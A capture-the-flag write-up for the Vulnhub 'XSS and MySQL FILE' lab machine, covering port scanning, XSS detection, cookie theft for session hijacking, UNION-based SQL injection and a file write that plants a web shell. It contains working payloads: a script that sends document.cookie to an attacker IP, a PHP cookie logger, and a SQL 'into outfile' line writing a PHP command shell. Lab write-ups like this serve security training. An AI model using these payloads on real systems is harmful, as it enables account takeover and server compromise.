---
title: Vulnhub - XSS and MySQL file.
categories: [Writeup, webExploitation]
tags: [xss, sqli, sqli Writing Files, easy]
description: In this Writeup we will face a Cross-site scripting (XSS) exploitation and SQLI File Write permissions to obtain RCE. 
---

Download vulnerable target machine: [Pentester Lab: XSS and MySQL FILE](https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/)

# XSS and MySQL file.

## Discovery.

### Port Scan.

The first step is allways to run nmap and see which ports are opened in the target.
```bash
nmap -p- -Pn -sS --min-rate 5000 --open 192.168.1.66 -oN scan
```
![img-description](assets/img/writeups/2024/xssAndMysqlFile/1.png)
_Ports scan._

```bash
nmap -p22,80 -sVC -Pn 192.168.1.39 -oN versions
```

![img-description](assets/img/writeups/2024/xssAndMysqlFile/2.png)
_Once we know wich ports are opened we make an nmap version scan._


The nmap scan showed two opened ports, port __22__ `ssh` and __80__ `http`. I tried to acces to the ssh service and I made a `whatweb` scan, but none of this actions gave me interesting results. So, I proceed with the [manual web enumaration.](#manual-web-enumeration)

-------------
### Manual web enumeration.
The web page we are facing is a blog,

![img-description](assets/img/writeups/2024/xssAndMysqlFile/3.png)
_Our target is hosting a blog._

__I saw a Comments section, it's an interesting place to try to insert some payloads and try to exploit an XSS vulnerability.__

![img-description](assets/img/writeups/2024/xssAndMysqlFile/30.png)


## Exploitation.
### XSS.
>You can visit my GitHub profile to see and study all the techniques we are going to use from now on. [XSS Cross-Site Scripting.](https://github.com/PentesterArchive/Hacking-Web/tree/main/XSS%20Cross-Site%20Scripting)
{: .prompt-info }

#### XSS detection.
When we are facing more than 1 possible vulnerable xss fields we can use the next technique to know which of them are vulnerable:<br />
1. We must __run a web server in our local machine__, to do so we can use python, `python3 -m http.server 80`
2. Now we are going to _inject all the fields from the comment section using __different url's___ for all of them. Those URL's will have the next structure `http://<OurIPAdress>/<inputName>`.
![img-description](assets/img/writeups/2024/xssAndMysqlFile/5.png)

3. If our payloads succeded we must __receive a connection from the vulnerable field__ as we can see in the following picture:

![img-description](assets/img/writeups/2024/xssAndMysqlFile/6.png)

> Result: The "text" field is vulnerable to XSS.


#### XSS Session Hijacking.
> You can acces to my Github repository to explore how to execute [XSS - Session Hijacking.](https://github.com/PentesterArchive/Hacking-Web/blob/main/XSS%20Cross-Site%20Scripting/XSS%20ATTACKS/XSS%20Session%20Hijacking.md)
{: .prompt-info }

We are going to try to execute a Session Hijacking attack. To do so, we are going to follow the techniques explained in [XSS - Session Hijacking.](https://github.com/PentesterArchive/Hacking-Web/blob/main/XSS%20Cross-Site%20Scripting/XSS%20ATTACKS/XSS%20Session%20Hijacking.md)<br />

At this point we need to send back our payload pointing to the [script.js](#scriptjs) file we are going to create. 
##### script.js
```javascript
new Image().src='http://<OUR_IP>/index.php?c='+document.cookie;
```
This `script.js` is pointing to [index.php](#indexphp), which will create and store all the cookies we retrieve in `cookies.txt`.
##### index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

__Now we can send our payload.__
```js
<script src="http://<LocalIPAdress>/script.js></script>"
```
![img-description](assets/img/writeups/2024/xssAndMysqlFile/8.png)


Finally we have to keep listening in our local machine __waiting to obtain the cookies__.
> If our attack was succesful we will see a similar output: <br />
![img-description](assets/img/writeups/2024/xssAndMysqlFile/9.png)
_Those are the cookies we obtained. The first cookies are ours, so we are interested in the last cookies._

As I said before `index.php` created `cookies.txt` where we can read all of them.

![img-description](assets/img/writeups/2024/xssAndMysqlFile/10.png)

__We can finally use the cookies and gain access to the [admin panel](#admin-panel).__
![img-description](assets/img/writeups/2024/xssAndMysqlFile/9.5.png)


### Admin Panel
Once in the admin panel we can see some of the actions we can execute being admin. But none of them are a good option to gain code execution.
![img-description](assets/img/writeups/2024/xssAndMysqlFile/13.png)

In the "edit blog" section we can see `id=1`, this is a perfect place to try to execute a [SQL Injection](#sql-injection)
![img-description](assets/img/writeups/2024/xssAndMysqlFile/14.png)



### SQL Injection.
> You can acces to my Github repository to explore how to execute [SQLI Database Enumeration.](https://github.com/PentesterArchive/Hacking-Web/tree/main/SQL%20Injection/SQLI%20Database%20Enumeration)
{: .prompt-info }

#### SQLI Detection.
As allways we can start the SQLI detection by injecting `'` and seeing how the server response.
![img-description](assets/img/writeups/2024/xssAndMysqlFile/15.png)

As we can see we have an error in our SQL syntax, it means that __we can inject SQL commands__.

### SQLI exploitation.

#### SQLI dumping data.
##### Obtaining the total number of columns.
We are going to use __ORDER BY__ Querys to see the number of columns of the db.
`ORDER BY 4;`
![img-description](assets/img/writeups/2024/xssAndMysqlFile/16.png)
`ORDER BY 5;`
![img-description](assets/img/writeups/2024/xssAndMysqlFile/17.png)

> Result: It has only 4 columns.

Now it's time to see in which of them are our querys being outputed.
`UNION BY 1,2,3,4`
![img-description](assets/img/writeups/2024/xssAndMysqlFile/18.png)
> Result: 2,3, the column 1 and 4 exists but they are not shown.

__I tried a lot of different methods to dump the data from the database but none of them was successful, But this is not the only attack we can execute via SQLI.__

#### SQLI Writting Files.
> You can acces to my Github repository to explore how to execute [SQLI File Manipulation.](https://github.com/PentesterArchive/Hacking-Web/tree/main/SQL%20Injection/SQLI%20File%20Manipulation)
{: .prompt-info }

##### Checking our user privileges.
Before writting any file we have to __chek if we have enough privileges__ to do so.<br />
We will use the next command to see which db user we are utilizing and then obtain his privileges.
```sql
UNION SELECT 1, 2, user(), 4
```
![img-description](assets/img/writeups/2024/xssAndMysqlFile/22.png)
> Result: Our user is root.

The next command will show if we have super user privileges.
```sql
UNION SELECT 1, 2, super_priv, 4 FROM mysql.user -- -
```
![img-description](assets/img/writeups/2024/xssAndMysqlFile/23.png)
> Result: We have super user privileges.

The `secure_file_priv` variable is used to determine where to read/write files from.
```sql
UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
![img-description](assets/img/writeups/2024/xssAndMysqlFile/24.png)
> Result: The secure_file_priv value is empty, we can read/write files to any location.


__With all the data we have obtained we can confirm that we are able to write files.__



##### Obtaining RCE.
We need to use a route to write our file. We can for example use the directory that the error message shows us when we make an SQL syntax error: 
![img-description](assets/img/writeups/2024/xssAndMysqlFile/25.png)
__Sadly I couldn't execute my commands using this route so we must find other.__

__If we check the code we can see the `/css` url, it's another good place to insert our sell.__
![img-description](assets/img/writeups/2024/xssAndMysqlFile/26.png)

We can use the next payload to create our file in the `css` directory:
```sql
id=3 union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/css/cmd.php'
```



![img-description](assets/img/writeups/2024/xssAndMysqlFile/27.png)

We finally have remote code execution!

![img-description](assets/img/writeups/2024/xssAndMysqlFile/29.png)




